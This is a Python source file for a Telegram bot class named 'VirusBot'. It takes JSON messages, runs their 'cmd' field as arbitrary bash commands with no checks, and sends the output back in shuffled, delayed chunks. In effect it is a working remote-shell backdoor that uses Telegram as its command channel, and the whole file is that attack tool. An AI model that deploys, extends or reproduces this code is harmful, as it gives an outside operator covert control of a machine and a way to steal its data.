import asyncio
import json
import random
import subprocess
import uuid

from telegram import Update
from telegram.ext import CallbackContext

from app.settings import Settings


def split_text_into_chunks(text: str, max_size: int) -> list[str]:
    chunks = [text[i : i + max_size] for i in range(0, len(text), max_size)]
    if len(chunks) == 1:
        index = len(text) // 2
        chunks = [text[:index], text[index:]]
    return chunks


class VirusBot:
    def __init__(self):
        self._id = None
        self._update = None
        self._task = None
        self._responses = []

    async def run_callbacks(self):
        try:
            await asyncio.sleep(2)
            self._id = str(uuid.uuid4())
            while self._responses:
                await asyncio.sleep(2)
                if self._responses:
                    data = self._responses.pop()
                    await self._update.message.reply_text(data)
                else:
                    await self._update.message.reply_text(json.dumps({}))
        finally:
            self._id = None
            self._update = None
            self._task = None

    async def handle_message(self, update: Update, context: CallbackContext) -> None:
        cmd_id = None
        try:
            cmd = json.loads(update.message.text)
            print(cmd)
            cmd_id = cmd["cmd_id"]
            cmd_msg = cmd["cmd"]

            result = subprocess.run(
                ["bash", "-c", cmd_msg], capture_output=True, text=True
            )
            resp = {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
            }
            resp_str = json.dumps(resp)
            split_cmd = split_text_into_chunks(resp_str, Settings.MAX_SIZE)
            chunks = [
                json.dumps(
                    {
                        "index": i,
                        "len": len(split_cmd),
                        "cmd_id": cmd_id,
                        "chunk": item,
                    }
                )
                for i, item in enumerate(split_cmd)
            ]
            self._responses.extend(chunks)
            random.shuffle(self._responses)
            if self._task is None:
                self._update = update
                self._task = asyncio.create_task(self.run_callbacks())
        except Exception as e:
            await update.message.reply_text(
                json.dumps(
                    {
                        "index": 0,
                        "len": 1,
                        "cmd_id": cmd_id,
                        "chunk": str(e),
                    }
                )
            )
